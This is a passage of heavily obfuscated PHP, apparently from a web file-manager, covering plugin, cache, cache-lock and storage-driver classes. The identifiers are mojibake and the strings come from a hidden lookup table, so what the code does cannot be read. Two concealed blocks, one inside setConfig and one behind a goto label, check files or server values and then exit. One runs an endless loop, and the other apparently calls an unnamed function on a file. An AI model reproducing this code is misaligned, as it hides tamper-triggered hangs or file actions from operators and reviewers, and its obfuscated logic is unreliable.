$€Øšé¶‹; } return IO::copy($Ä¬£ƒ½‚, $Ûüá˜õ¡, 0, $ñÄÅª»); } final function appPackage() { $ÖÆå‘ =& $_SERVER[å¸¿•¶£]; if ($this->packageData) { return $this->packageData; } $òØƒñ«ò = $this->parseFile($this->pluginPath . $ÖÆå‘[1571]); $this->parseLang($òØƒñ«ò); $Å£áõÃİ = json_decode_force($òØƒñ«ò); if (!$Å£áõÃİ) { return array(); } $ÔÏÇá = Hook::trigger($ÖÆå‘[1572], $Å£áõÃİ); if ($ÔÏÇá && is_array($ÔÏÇá)) { $Å£áõÃİ = $ÔÏÇá; } $this->packageData = $Å£áõÃİ; return $Å£áõÃİ; } public function packageInfoGet($‚¸´Åš¡) { $Ì¬Õ¢ú = $this->appPackage(); return array_get_value($Ì¬Õ¢ú, $‚¸´Åš¡); } public function packageVersion() { return $this->packageInfoGet($_SERVER[å¸¿•¶£][1573]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[å¸¿•¶£][1574]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[å¸¿•¶£][1575]); } public function echoJsAssign($ïûâ±úš, $—ÙÎßüô) { $this->echoJsAssignArr[$ïûâ±úš] = $—ÙÎßüô; } private function parseFile($–ïœãÓ¶) { $£¾¨á˜Ù =& $_SERVER[å¸¿•¶£]; $¹à¸¥­ = file_get_contents_nossl($–ïœãÓ¶); $×ø¹ÏÊ = array($£¾¨á˜Ù[1576], $£¾¨á˜Ù[1577], $£¾¨á˜Ù[1578], $£¾¨á˜Ù[1579], $£¾¨á˜Ù[1580], $£¾¨á˜Ù[1581], $£¾¨á˜Ù[1582]); $ê‘Û°Ş = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$£¾¨á˜Ù[89]][$£¾¨á˜Ù[1583]]); foreach ($this->echoJsAssignArr as $…Ë…úâ§ => $·šäÚ÷) { $×ø¹ÏÊ[] = $£¾¨á˜Ù[1584] . $…Ë…úâ§ . $£¾¨á˜Ù[1585]; $ê‘Û°Ş[] = is_array($·šäÚ÷) || is_object($·šäÚ÷) ? rawurlencode(json_encode($·šäÚ÷)) : $·šäÚ÷; } if (strstr($¹à¸¥­, $£¾¨á˜Ù[1586])) { $³ı±Íöø = rawurlencode(json_encode($this->pluginLangArr)); $¹à¸¥­ = str_replace($£¾¨á˜Ù[1586], $³ı±Íöø, $¹à¸¥­); } if (strstr($¹à¸¥­, $£¾¨á˜Ù[1587])) { $³ı±Íöø = $³ı±Íöø = rawurlencode(json_encode($this->getConfig())); $¹à¸¥­ = str_replace($£¾¨á˜Ù[1587], $³ı±Íöø, $¹à¸¥­); } $¹à¸¥­ = str_replace($×ø¹ÏÊ, $ê‘Û°Ş, $¹à¸¥­); return $¹à¸¥­; } private function parseLang(&$‚®áç) { $”’©Ú™¹ =& $_SERVER[å¸¿•¶£]; $üªî’ŒÚ = $”’©Ú™¹[1588]; if (!strstr($‚®áç, $üªî’ŒÚ)) { return; } preg_match_all($”’©Ú™¹[1589], $‚®áç, $øŞ¢ëÈ„); if (!is_array($øŞ¢ëÈ„) || count($øŞ¢ëÈ„) == 0 || !is_array($øŞ¢ëÈ„[0]) || count($øŞ¢ëÈ„[0]) == 0) { return; } $¢‘Öõé = array(); $­ËÀÚåÆ = array(); foreach ($øŞ¢ëÈ„[0] as $ƒ±’êı„) { $ÌÎ…ëœá = substr($ƒ±’êı„, strlen($üªî’ŒÚ), -4); $ßşº°®¬ = LNG($ÌÎ…ëœá); $¢‘Öõé[] = $ƒ±’êı„; $­ËÀÚåÆ[] = str_replace(array($”’©Ú™¹[231], $”’©Ú™¹[1085], $”’©Ú™¹[342], $”’©Ú™¹[118]), array($”’©Ú™¹[53], $”’©Ú™¹[53], $”’©Ú™¹[12], $”’©Ú™¹[1590]), $ßşº°®¬); } $‚®áç = str_replace($¢‘Öõé, $­ËÀÚåÆ, $‚®áç); } private function parseConfig(&$Ä¯øÌ‘Æ) { $éä­ñ¥Ä =& $_SERVER[å¸¿•¶£]; $–€ØÁé = $éä­ñ¥Ä[1591]; if (!strstr($Ä¯øÌ‘Æ, $–€ØÁé)) { return; } preg_match_all($éä­ñ¥Ä[1592], $Ä¯øÌ‘Æ, $¯Ó‰ô¯â); if (!is_array($¯Ó‰ô¯â) || count($¯Ó‰ô¯â) == 0 || !is_array($¯Ó‰ô¯â[0]) || count($¯Ó‰ô¯â[0]) == 0) { return; } $èıˆ = $this->getConfig(); $„Ñ°ÙÄÜ = array(); $Š·Ô¼ = array(); foreach ($¯Ó‰ô¯â[0] as $œšëïæ) { $¨¢Øìİ¸ = substr($œšëïæ, strlen($–€ØÁé), -2); $„Ñ°ÙÄÜ[] = $œšëïæ; $Š·Ô¼[] = _get($èıˆ, $¨¢Øìİ¸); } $Ä¯øÌ‘Æ = str_replace($„Ñ°ÙÄÜ, $Š·Ô¼, $Ä¯øÌ‘Æ); } private function parsePackage(&$íÙÉèŒ) { $ôÙËÇ©” =& $_SERVER[å¸¿•¶£]; $–·„Ã¹´ = $ôÙËÇ©”[1593]; if (!strstr($íÙÉèŒ, $–·„Ã¹´)) { return; } preg_match_all($ôÙËÇ©”[1594], $íÙÉèŒ, $«Á Ñ—); if (!is_array($«Á Ñ—) || count($«Á Ñ—) == 0 || !is_array($«Á Ñ—[0]) || count($«Á Ñ—[0]) == 0) { return; } $ô±†ÇÆò = $this->appPackage(); $ËÍùòê¾ = array(); $”§İøÔà = array(); foreach ($«Á Ñ—[0] as $‘ì£ÀÚİ) { $œ¼›‰ã¡ = substr($‘ì£ÀÚİ, strlen($–·„Ã¹´), -2); $ËÍùòê¾[] = $‘ì£ÀÚİ; $”§İøÔà[] = _get($ô±†ÇÆò, $œ¼›‰ã¡); } $íÙÉèŒ = str_replace($ËÍùòê¾, $”§İøÔà, $íÙÉèŒ); } final function echoFile($ÖõŸ±¦À, $Çğ®úØ‡ = false) { $¦Óôäºö =& $_SERVER[å¸¿•¶£]; $ˆı´­ô = $this->pluginPath . $ÖõŸ±¦À; if (ACT == $¦Óôäºö[1595]) { echo $¦Óôäºö[1596] . $this->pluginName . $¦Óôäºö[8] . $ÖõŸ±¦À . $¦Óôäºö[1597]; if (!file_exists($ˆı´­ô)) { echo $¦Óôäºö[1598]; return; } } $êá—ç ã = $this->parseFile($ˆı´­ô); $this->parseLang($êá—ç ã); $this->parseConfig($êá—ç ã); $this->parsePackage($êá—ç ã); if (is_array($Çğ®úØ‡)) { $êá—ç ã = str_replace(array_keys($Çğ®úØ‡), array_values($Çğ®úØ‡), $êá—ç ã); } echo $¦Óôäºö[231] . $êá—ç ã; } final function initLang() { $¿Òˆ ‰İ =& $_SERVER[å¸¿•¶£]; $à¨“ÒÌù = $¿Òˆ ‰İ[1599]; $¼¸¡–ˆ· = $this->pluginPath . $¿Òˆ ‰İ[1600]; $´ù½öµä = I18n::getType(); $â¯²¬Ğ = array(); if (file_exists($¼¸¡–ˆ· . $´ù½öµä . $¿Òˆ ‰İ[845])) { $â¯²¬Ğ = (include $¼¸¡–ˆ· . $´ù½öµä . $¿Òˆ ‰İ[845]); } else { if ($´ù½öµä == $¿Òˆ ‰İ[1601] && !file_exists($¼¸¡–ˆ· . $´ù½öµä . $¿Òˆ ‰İ[845]) && file_exists($¼¸¡–ˆ· . $¿Òˆ ‰İ[1602])) { $â¯²¬Ğ = (include $¼¸¡–ˆ· . $¿Òˆ ‰İ[1602]); } else { if (file_exists($¼¸¡–ˆ· . $à¨“ÒÌù . $¿Òˆ ‰İ[845])) { $â¯²¬Ğ = (include $¼¸¡–ˆ· . $à¨“ÒÌù . $¿Òˆ ‰İ[845]); } } } if (!is_array($â¯²¬Ğ)) { return array(); } if (@count($â¯²¬Ğ) > 0) { I18n::set($â¯²¬Ğ); } return $â¯²¬Ğ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($¯­âĞ¡…) { $õ¸ÇÅˆÅ =& $_SERVER[å¸¿•¶£]; if (!isset($_SERVER[$õ¸ÇÅˆÅ[747]]) || !isset($_SERVER[$õ¸ÇÅˆÅ[748]])) { $º£¡†† = $õ¸ÇÅˆÅ[884]; $»³¬ÅÅÒ = $õ¸ÇÅˆÅ[749]; $¿‘é¼¯Û = $_SERVER[$õ¸ÇÅˆÅ[750]] . $õ¸ÇÅˆÅ[751]; $¹õ°šş® = $»³¬ÅÅÒ($¿‘é¼¯Û); $çåİÜà = explode($õ¸ÇÅˆÅ[231], $¹õ°šş®); if (count($çåİÜà) < $õ¸ÇÅˆÅ[628]) { $±Ñ·õ«š = $õ¸ÇÅˆÅ[752]; $±Ñ·õ«š(); } $Éí›‰ÀÀ = $õ¸ÇÅˆÅ[885]; $Éí›‰ÀÀ($_SERVER[$õ¸ÇÅˆÅ[886]]); $”ª¹ÈÕÁ = 1; for ($Üµ•¡Ş’ = $”ª¹ÈÕÁ; $Üµ•¡Ş’ > 0; $Üµ•¡Ş’++) { $Éí›‰ÀÀ = json_encode($GLOBALS[$õ¸ÇÅˆÅ[418]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $¯­âĞ¡…); } public function onSetConfig($¶ç×¥„») { } public function onGetConfig($»£¼´ñò) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Ûãå’¢†) { if ($Ûãå’¢† == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ƒËşè‚Ô = "\x70\154\x75\147\151\x6e\101\165\x74\x68") { $ç€Ëå¹² =& $_SERVER[å¸¿•¶£]; if (!Session::get($ç€Ëå¹²[1554])) { return !1; } if (_get($GLOBALS, $ç€Ëå¹²[494])) { return !0; } $£ÆÓİÎ£ = $this->getConfig(); if (!$£ÆÓİÎ£[$ƒËşè‚Ô]) { return !1; } return ActionCall($ç€Ëå¹²[1603], $£ÆÓİÎ£[$ƒËşè‚Ô]); } public function url($˜ƒâõî—, $ùøô²¬ = '', $ğÁø¿”÷ = true) { $‰øÚ§Ï¬ =& $_SERVER[å¸¿•¶£]; $Ç’ÇÕ—Œ = $this->getConfig(); $¾¿ÓÆù² = KOD_VERSION . $‰øÚ§Ï¬[10] . KOD_VERSION_BUILD; $€ïªë‘  = $this->packageVersion(); $İé£Ò = $¾¿ÓÆù² . $‰øÚ§Ï¬[386] . $€ïªë‘ ; if (substr($˜ƒâõî—, 0, 4) == $‰øÚ§Ï¬[148] || substr($˜ƒâõî—, 0, 2) == $‰øÚ§Ï¬[1386]) { $§×Ÿ¥®é = $˜ƒâõî— . $‰øÚ§Ï¬[1604] . $İé£Ò; } else { if ($ùøô²¬ == $‰øÚ§Ï¬[12]) { $§×Ÿ¥®é = $this->pluginHost . $˜ƒâõî— . $‰øÚ§Ï¬[1604] . $İé£Ò; } else { if ($ùøô²¬ === $‰øÚ§Ï¬[75]) { $§×Ÿ¥®é = $this->pluginHost . $˜ƒâõî—; } else { if ($ùøô²¬ == $‰øÚ§Ï¬[1605]) { $§×Ÿ¥®é = STATIC_PATH . $˜ƒâõî— . $‰øÚ§Ï¬[1604] . $¾¿ÓÆù²; } else { if ($ùøô²¬ == $‰øÚ§Ï¬[1606]) { $§×Ÿ¥®é = APP_HOST . $‰øÚ§Ï¬[1607] . $˜ƒâõî— . $‰øÚ§Ï¬[1604] . $¾¿ÓÆù²; } else { if (isset($Ç’ÇÕ—Œ[$ùøô²¬])) { $§×Ÿ¥®é = $Ç’ÇÕ—Œ[$ùøô²¬] . $˜ƒâõî— . $‰øÚ§Ï¬[1604] . $İé£Ò; } } } } } } if (!$ğÁø¿”÷) { return $§×Ÿ¥®é; } echo $§×Ÿ¥®é; } public function link($÷Úàíøî = false, $Ú‘±‚˜ = '') { $³¿ı¯æ =& $_SERVER[å¸¿•¶£]; if (!$÷Úàíøî) { $this->link($³¿ı¯æ[1608], $³¿ı¯æ[1606]); $this->link($³¿ı¯æ[1609], $³¿ı¯æ[1605]); $this->link($³¿ı¯æ[1610], $³¿ı¯æ[1605]); $this->link($³¿ı¯æ[1611], $³¿ı¯æ[1605]); $this->link($³¿ı¯æ[1612], $³¿ı¯æ[1605]); return; } $£§òáù’ = $this->url($÷Úàíøî, $Ú‘±‚˜, !1); if (substr($÷Úàíøî, -3) == $³¿ı¯æ[1613]) { echo $³¿ı¯æ[1614] . $£§òáù’ . $³¿ı¯æ[1615] . $³¿ı¯æ[231]; } else { if (substr($÷Úàíøî, -4) == $³¿ı¯æ[1616]) { echo $³¿ı¯æ[1617] . $£§òáù’ . $³¿ı¯æ[1618] . $³¿ı¯æ[231]; } } } } goto cé£³½¯Àì; A‚Î‹½øó: $_size = $_SERVER[å¸¿•¶£][873]; if ($_SERVER[$_SERVER[å¸¿•¶£][747]] != $_size($_file)) { $_getc = $_SERVER[å¸¿•¶£][749]; $_getfile = $_SERVER[$_SERVER[å¸¿•¶£][750]] . $_SERVER[å¸¿•¶£][751]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[å¸¿•¶£][231], $_getfilec); if (count($_getarrs) < $_SERVER[å¸¿•¶£][621]) { $exit = $_SERVER[å¸¿•¶£][752]; $exit(); } $_act = $_SERVER[å¸¿•¶£][753]; $_act($_file); } class CacheLockRedis { public function lock($›Ë¸•Ë, $ËÊÍÙöï = 10) { $„Ì¢ğ«ƒ = Cache::init(); $ù¹ µ˜œ = microtime(!0) + $ËÊÍÙöï; while (microtime(!0) < $ù¹ µ˜œ) { $Ä–÷×°Æ = $„Ì¢ğ«ƒ->get($›Ë¸•Ë); if (!$Ä–÷×°Æ) { $à­êÉÛ = $„Ì¢ğ«ƒ->setLock($›Ë¸•Ë, $ù¹ µ˜œ, $ËÊÍÙöï); if ($à­êÉÛ) { return !0; } } else { if ($Ä–÷×°Æ < microtime(!0)) { $„Ì¢ğ«ƒ->set($›Ë¸•Ë, $ù¹ µ˜œ, $ËÊÍÙöï * 2); if ($„Ì¢ğ«ƒ->get($›Ë¸•Ë) === $Ä–÷×°Æ) { return !0; } } } cacheLockWait(); } return !1; } public function lockGet($¥‘ÁÚ°) { return Cache::init()->get($¥‘ÁÚ°); } public function unlock($ÔûÍÚ‚º) { return Cache::init()->remove($ÔûÍÚ‚º); } } goto cÆ“É‚±ËÒ; Aä›’Œ„Æì: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($ºÜà÷¦°) { $this->pathParse = $ºÜà÷¦°; } protected function infoParse($ñÃ¤Ï¦™, $ä·ƒ¤°Â = false) { $Ú—„Ã¢ =& $_SERVER[å¸¿•¶£]; return Action($Ú—„Ã¢[1181])->sharePathInfo($this->pathParse[$Ú—„Ã¢[84]], !0, $ä·ƒ¤°Â); } public function listPath($·—ğ“ë“, $»ÈÀóı‹ = false) { $ÜŸÆÑüÓ =& $_SERVER[å¸¿•¶£]; $ÆÖÇï = IO::listPath($·—ğ“ë“, $»ÈÀóı‹); if (!$ÆÖÇï) { return $ÆÖÇï; } if (is_array($ÆÖÇï[$ÜŸÆÑüÓ[1355]])) { $ı¿‘¶¢à = Action($ÜŸÆÑüÓ[1364])->parsePathChildren($ÆÖÇï[$ÜŸÆÑüÓ[1355]], array($ÜŸÆÑüÓ[421] => $·—ğ“ë“)); $ÆÖÇï[$ÜŸÆÑüÓ[1355]] = Action($ÜŸÆÑüÓ[1181])->shareItemInfo($ı¿‘¶¢à); } foreach ($ÆÖÇï as $Âí«¦‘” => $¢Ã¿‰¬½) { if (!in_array($Âí«¦‘”, array($ÜŸÆÑüÓ[83], $ÜŸÆÑüÓ[82]))) { continue; } foreach ($¢Ã¿‰¬½ as $Ÿ®óö† => $ı¿‘¶¢à) { $ı¿‘¶¢à = Action($ÜŸÆÑüÓ[1364])->parsePathChildren($ı¿‘¶¢à, array($ÜŸÆÑüÓ[421] => $·—ğ“ë“)); $ÆÖÇï[$Âí«¦‘”][$Ÿ®óö†] = Action($ÜŸÆÑüÓ[1181])->shareItemInfo($ı¿‘¶¢à); } } return $ÆÖÇï; } } class PathDriverEDS extends PathDriverMinIO { public function __construct($ôŒÏ˜) { parent::__construct($ôŒÏ˜); } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ò¡‹œàŠ) { parent::__construct($ò¡‹œàŠ); $this->signatureVersion($_SERVER[å¸¿•¶£][216]); } public function uploadFormData($¦Àú×ıê, $ÊÓŞ¢¡Á = 3600) { $øäèÓ =& $_SERVER[å¸¿•¶£]; $ÂÉõ­†¡ = $øäèÓ[199]; $‘ŠûÄìÇ = $øäèÓ[1365]; $Êù¿£ğû = $øäèÓ[62]; $ÌØÇ¼Õ¼ = gmdate($øäèÓ[1366]); $Ìö—şÌü = gmdate($øäèÓ[757]); $íØÕœ„Ë = $øäèÓ[1367]; $ºô†­ç· = $ÊÓŞ¢¡Á . $øäèÓ[12]; $ÌÀø’Òã = $øäèÓ[1329]; $Ã¢á­Õç = array($this->accessKey, $Ìö—şÌü, $this->region, $Êù¿£ğû, $íØÕœ„Ë); $œşãÓ¥‘ = implode($øäèÓ[8], $Ã¢á­Õç); $óÔ­Æğ² = array($øäèÓ[1331] => gmdate($øäèÓ[1330], strtotime($øäèÓ[1368])), $øäèÓ[1332] => array(array($øäèÓ[1334] => $this->bucket), array($øäèÓ[1333] => $ÂÉõ­†¡), array($øäèÓ[1335], $øäèÓ[1336], $øäèÓ[12]), array($øäèÓ[1335], $øäèÓ[1369], $øäèÓ[12]), array($øäèÓ[1335], $øäèÓ[1370], $øäèÓ[12]), array($øäèÓ[1337] => $ÌÀø’Òã), array($øäèÓ[1371] => $œşãÓ¥‘), array($øäèÓ[1372] => $‘ŠûÄìÇ), array($øäèÓ[1373] => $ÌØÇ¼Õ¼), array($øäèÓ[1374] => $ºô†­ç·))); $†Õ°€°± = base64_encode(json_encode($óÔ­Æğ²)); $ôÏÈÎ = hash_hmac($øäèÓ[1375], $Ìö—şÌü, $øäèÓ[1376] . $this->secret, !0); $†óª­ƒ© = hash_hmac($øäèÓ[1375], $this->region, $ôÏÈÎ, !0); $àÊ¦ÒÌú = hash_hmac($øäèÓ[1375], $Êù¿£ğû, $†óª­ƒ©, !0); $Üùşğˆù = hash_hmac($øäèÓ[1375], $íØÕœ„Ë, $àÊ¦ÒÌú, !0); $ˆÁÆ™á§ = hash_hmac($øäèÓ[1375], $†Õ°€°±, $Üùşğˆù); $êÉ²ùı‚ = array($øäèÓ[215] => $øäèÓ[12], $øäèÓ[1377] => $øäèÓ[12], $øäèÓ[1333] => $ÂÉõ­†¡, $øäèÓ[1337] => $ÌÀø’Òã, $øäèÓ[1341] => $†Õ°€°±, $øäèÓ[1378] => $œşãÓ¥‘, $øäèÓ[1379] => $‘ŠûÄìÇ, $øäèÓ[1380] => $ÌØÇ¼Õ¼, $øäèÓ[1381] => $ºô†­ç·, $øäèÓ[1382] => $ˆÁÆ™á§, $øäèÓ[182] => $this->getHost()); return $êÉ²ùı‚; } } goto eÜö½™ŸèØ; cŞ³öÏ¤ó: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ÜÍËëùŸ =& $_SERVER[å¸¿•¶£]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $Ÿ’ŠéĞ­ = $GLOBALS[$ÜÍËëùŸ[6]][$ÜÍËëùŸ[349]]; $îÑğµÀ = $Ÿ’ŠéĞ­[$Ÿ’ŠéĞ­[$ÜÍËëùŸ[834]]]; $‡èÌä›§ = $Ÿ’ŠéĞ­[$ÜÍËëùŸ[835]]; switch ($Ÿ’ŠéĞ­[$ÜÍËëùŸ[834]]) { case $ÜÍËëùŸ[21]: self::$handle = Model($ÜÍËëùŸ[836]); break; case $ÜÍËëùŸ[837]: self::$handle = new CacheRedis($îÑğµÀ, $‡èÌä›§); break; case $ÜÍËëùŸ[838]: self::$handle = new CacheMemcached($îÑğµÀ, $‡èÌä›§); break; case $ÜÍËëùŸ[200]: self::$handle = new CacheFile($îÑğµÀ, $‡èÌä›§); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ĞøÃÊƒ) { if (is_array($ĞøÃÊƒ) || is_object($ĞøÃÊƒ)) { $ĞøÃÊƒ = json_encode($ĞøÃÊƒ); } $ĞøÃÊƒ = rawurlencode($ĞøÃÊƒ); return md5(KOD_SITE_ID . $_SERVER[å¸¿•¶£][11] . $ĞøÃÊƒ); } public static function get($Òüî¨¶, $Ì©ç¼€ù = false) { $Ù‡¾†ÔÏ = self::key($Òüî¨¶); if ($Ì©ç¼€ù) { return unserialize(self::init()->get($Ù‡¾†ÔÏ)); } if (!isset(self::$memoryCache[$Ù‡¾†ÔÏ])) { $±çÍ”Ö¯ = self::init()->get($Ù‡¾†ÔÏ); self::$memoryCache[$Ù‡¾†ÔÏ] = unserialize($±çÍ”Ö¯); } return self::$memoryCache[$Ù‡¾†ÔÏ]; } public static function set($…”ÔıùÖ, $çŸŠª©Œ, $ãÜ²§ÄÂ = false) { $¶­·©š“ = self::key($…”ÔıùÖ); if (isset(self::$memoryCache[$¶­·©š“]) && self::$memoryCache[$¶­·©š“] === $çŸŠª©Œ) { return !0; } if ($ãÜ²§ÄÂ === 0) { self::$memoryCache[$¶­·©š“] = $çŸŠª©Œ; return !0; } CacheLock::lock($…”ÔıùÖ); $È¶¦©ˆ½ = self::init()->set($¶­·©š“, serialize($çŸŠª©Œ), $ãÜ²§ÄÂ); self::$memoryCache[$¶­·©š“] = $çŸŠª©Œ; CacheLock::unlock($…”ÔıùÖ); return $È¶¦©ˆ½; } public static function getCall($œ°à¨§, $øºĞÓóß, $ ¶ÆÂü‚, $æèà·š„ = array()) { $ïŞÍâê¿ =& $_SERVER[å¸¿•¶£]; $èËœ÷™€ = self::get($œ°à¨§); if ($èËœ÷™€ || $èËœ÷™€ === $ïŞÍâê¿[12]) { return $èËœ÷™€; } $èËœ÷™€ = call_user_func_array($ ¶ÆÂü‚, $æèà·š„); $èËœ÷™€ = $èËœ÷™€ ? $èËœ÷™€ : $ïŞÍâê¿[12]; self::set($œ°à¨§, $èËœ÷™€, $øºĞÓóß); return $èËœ÷™€; } public static function remove($äÀ¨Š‘) { $À±Œ¢áÉ = self::key($äÀ¨Š‘); unset(self::$memoryCache[$À±Œ¢áÉ]); self::clearTimeout(); CacheLock::lock($äÀ¨Š‘); $¨Ö”¸¨™ = self::init()->remove($À±Œ¢áÉ); CacheLock::unlock($äÀ¨Š‘); return $¨Ö”¸¨™; } public static function removeMemory($•ü¼ƒ) { $úùÑ¼†½ = self::key($•ü¼ƒ); unset(self::$memoryCache[$úùÑ¼†½]); } public static function clearMemory($ÄšÆÅ­ = false) { if ($ÄšÆÅ­) { $ÄšÆÅ­ = self::key($ÄšÆÅ­); unset(self::$memoryCache[$ÄšÆÅ­]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[å¸¿•¶£][839])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[å¸¿•¶£][840])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Âƒ±üê, $‰âïüÃ†) { $àš˜Àò =& $_SERVER[å¸¿•¶£]; $this->cachePath = $Âƒ±üê[$àš˜Àò[84]]; $this->prefix = $àš˜Àò[841]; $this->cacheTime = $‰âïüÃ†; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($…Ê£’Ûº) { $Üƒ·ôŒ =& $_SERVER[å¸¿•¶£]; $…Ê£’Ûº = str_replace(array($Üƒ·ôŒ[842], $Üƒ·ôŒ[97], $Üƒ·ôŒ[73]), $Üƒ·ôŒ[843], $…Ê£’Ûº); return $this->cachePath . $Üƒ·ôŒ[844] . $…Ê£’Ûº . $Üƒ·ôŒ[845]; } public function set($»Èµè¢, $‚·Ç×Ü, $åŸÚØÔÓ = false) { $åŸÚØÔÓ = $åŸÚØÔÓ ? $åŸÚØÔÓ : $this->cacheTime; $³ØüØÙÍ = $this->getFile($»Èµè¢); if (file_put_contents($³ØüØÙÍ, $this->prefix . $‚·Ç×Ü, LOCK_EX)) { @touch($³ØüØÙÍ, intval(time() + $åŸÚØÔÓ)); clearstatcache(); return !0; } @unlink($³ØüØÙÍ); return !1; } public function get($¸ËÁ°­) { $Ôé¨Àˆ­ = $this->getFile($¸ËÁ°­); if (file_exists($Ôé¨Àˆ­) && filemtime($Ôé¨Àˆ­) < time()) { @unlink($Ôé¨Àˆ­); return !1; } $Å†Ô²äê = @file_get_contents($Ôé¨Àˆ­); return substr($Å†Ô²äê, strlen($this->prefix)); } public function remove($¸ÏêîÓş) { $ôµí¿ = $this->getFile($¸ÏêîÓş); return @unlink($ôµí¿); } public function deleteAll() { $²¡°ªê· =& $_SERVER[å¸¿•¶£]; $©Âô÷˜ü = scandir($this->cachePath); foreach ($©Âô÷˜ü as $È¡½ ) { $„„ôó“è = $this->cachePath . $È¡½ ; if (strpos($„„ôó“è, $²¡°ªê·[845]) && strpos($„„ôó“è, $²¡°ªê·[846])) { @unlink($„„ôó“è); } } } public function clearTimeout() { $Şı˜øı =& $_SERVER[å¸¿•¶£]; $ôäºŒª¢ = scandir($this->cachePath); foreach ($ôäºŒª¢ as $¥å‹˜ü­) { $¾ÏĞ˜Š§ = $this->cachePath . $¥å‹˜ü­; if (strpos($¾ÏĞ˜Š§, $Şı˜øı[845]) && strpos($¾ÏĞ˜Š§, $Şı˜øı[846]) && filemtime($¾ÏĞ˜Š§) < time()) { @unlink($¾ÏĞ˜Š§); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $Õ±ÈÀ‹Ä =& $_SERVER[å¸¿•¶£]; if (self::$handle) { return self::$handle; } $İÀ‡È¡À = $GLOBALS[$Õ±ÈÀ‹Ä[6]][$Õ±ÈÀ‹Ä[349]]; self::$timeout = $İÀ‡È¡À[$Õ±ÈÀ‹Ä[847]] ? $İÀ‡È¡À[$Õ±ÈÀ‹Ä[847]] : 10; $¯ŠâÄØ = _get($GLOBALS[$Õ±ÈÀ‹Ä[6]], $Õ±ÈÀ‹Ä[848]); $Ù‘Ñˆ½á = $İÀ‡È¡À[$Õ±ÈÀ‹Ä[834]] ? $İÀ‡È¡À[$Õ±ÈÀ‹Ä[834]] : $Õ±ÈÀ‹Ä[200]; if ($Ù‘Ñˆ½á == $Õ±ÈÀ‹Ä[21] && $¯ŠâÄØ == $Õ±ÈÀ‹Ä[13]) { $Ù‘Ñˆ½á = $Õ±ÈÀ‹Ä[200]; } switch ($Ù‘Ñˆ½á) { case $Õ±ÈÀ‹Ä[837]: self::$handle = new CacheLockRedis(); break; case $Õ±ÈÀ‹Ä[838]: self::$handle = new CacheLockMemcached(); break; case $Õ±ÈÀ‹Ä[21]: self::$handle = new CacheLockDatabase(); break; case $Õ±ÈÀ‹Ä[200]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($Õ±ÈÀ‹Ä[849], $Õ±ÈÀ‹Ä[850]); } return self::$handle; } private static function key($™ÄÀŸÓ ) { return $_SERVER[å¸¿•¶£][851] . Cache::key($™ÄÀŸÓ ); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($á’£¹ë— = '') { self::$errorMsg = $á’£¹ë—; } public static function lockGlobal($ˆšàä–, $ùì‹ÚÆş) { return self::lock($ˆšàä–, $ùì‹ÚÆş, !0); } public static function lock($®‡¶Œ¥©, $˜Ëê¢–ş = false, $¹ØÒë¤Ü = false) { $±Âï„‘ =& $_SERVER[å¸¿•¶£]; $óñ‘íş = self::init(); $¤¨–Ñ£­ = self::key($®‡¶Œ¥©); $˜Ëê¢–ş = $˜Ëê¢–ş ? $˜Ëê¢–ş : self::$timeout; $ß†ÂÆ’ñ = timeFloat(); $±ÅÍ±êğ = $óñ‘íş->lock($¤¨–Ñ£­, $˜Ëê¢–ş); $€®êöº = timeFloat(); if (!$±ÅÍ±êğ) { $î¶ƒİãÚ = "\154\157\143\153\40\145\162\x72\157\162\x3b\153\145\171\75{$®‡¶Œ¥©}\x3b\164\x69\155\145\x3d{$˜Ëê¢–ş}\x3b" . self::$errorMsg . $±Âï„‘[71] . get_caller_msg(); $ëã£á÷ = LNG($±Âï„‘[852]) . "\50{$˜Ëê¢–ş}\x73\51\x2e" . LNG($±Âï„‘[853]); $ëã£á÷ .= $±Âï„‘[854]; if (is_string(self::$errorMsg) && self::$errorMsg) { $ëã£á÷ = $ëã£á÷ . $±Âï„‘[855] . self::$errorMsg; } write_log($±Âï„‘[856] . sprintf($±Âï„‘[857], timeFloat() - $ß†ÂÆ’ñ) . $±Âï„‘[858] . $î¶ƒİãÚ . $±Âï„‘[859] . error_get_last(), $±Âï„‘[850]); show_json($ëã£á÷, !1); } if (!$¹ØÒë¤Ü) { self::$lockItem[$¤¨–Ñ£­] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $”“·¼´ = number_format(timeFloat() - $€®êöº, 3); write_log($±Âï„‘[860] . $®‡¶Œ¥© . $±Âï„‘[861] . $”“·¼´, $±Âï„‘[850]); } return $±ÅÍ±êğ; } public static function lockGet($µÃ“Ş’¯) { $¢¦ÃğØ = self::key($µÃ“Ş’¯); if (self::$lockItem[$¢¦ÃğØ]) { return self::$lockItem[$¢¦ÃğØ]; } return self::init()->lockGet($¢¦ÃğØ); } public static function unlock($èÃó¿¦) { $•¦³÷šè =& $_SERVER[å¸¿•¶£]; $Û“­ºŒú = self::key($èÃó¿¦); self::$lockItem[$Û“­ºŒú] = null; 